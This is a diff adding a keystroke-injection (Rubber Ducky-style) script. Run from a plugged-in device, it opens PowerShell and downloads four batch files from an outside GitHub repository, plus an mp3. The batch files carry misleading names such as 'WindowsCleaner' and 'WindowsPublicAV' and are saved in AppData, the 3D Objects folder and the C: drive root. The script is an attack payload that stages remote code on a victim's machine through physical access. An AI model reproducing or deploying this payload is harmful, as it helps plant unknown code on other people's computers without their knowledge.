@@ -1,0 +1,38 @@
+GUI R
+DELAY 500
+STRING powershell
+DELAY  3000
+STRING $name = $env:username
+ENTER
+DELAY 10
+STRING $WindowsCleanerOutpath = "C:\Users\$name\3D objects\WindowsCleaner.bat"
+ENTER
+STRING $WindowsCleanerUri = "https://raw.githubusercontent.com/8Root/test/main/WindowsCleaner.bat"
+ENTER
+STRING Invoke-WebRequest -Uri $WindowsCleanerUri -OutFile $WindowsCleanerOutpath
+ENTER
+DELAY 100
+STRING $WindowsCleanerUpdaterOutpath = "C:\Users\$name\AppData\Roaming\Microsoft\WindowsCleanerUpdater.bat"
+ENTER
+STRING $WindowsCleanerUpdaterUri = "https://raw.githubusercontent.com/8Root/test/main/WindowsCleanerUpdater.bat"
+ENTER
+STRING Invoke-WebRequest -Uri $WindowsCleanerUpdaterUri -OutFile $WindowsCleanerUpdaterOutpath
+ENTER
+DELAY 100
+STRING $WindowsPublicAVOutpath = "C:\Users\$name\appdata\local\WindowsPublicAV.bat"
+ENTER
+STRING $WindowsPublicAVUri = "https://raw.githubusercontent.com/8Root/test/main/WindowsPublicAV.bat"
+ENTER
+STRING Invoke-WebRequest -Uri $WindowsPublicAVUri -OutFile $WindowsPublicAVOutpath
+ENTER
+DELAY 100
+STRING $WindowsPublicAVUpdaterOutpath = "C:\WindowsPublicAVUpdater.bat"
+ENTER
+STRING $WindowsPublicAVUpdaterUri = "https://raw.githubusercontent.com/8Root/test/main/WindowsPublicAVUpdater.bat"
+ENTER
+STRING Invoke-WebRequest -Uri $WindowsPublicAVUpdaterUri -OutFile $WindowsPublicAVUpdaterOutpath
+ENTER
+DELAY 100
+STRING Invoke-WebRequest -Uri "https://github.com/8Root/test/blob/main/x.mp3?raw=true" -OutFile "C:\Users\$name\appdata\locallow\x.mp3"
+ENTER
+
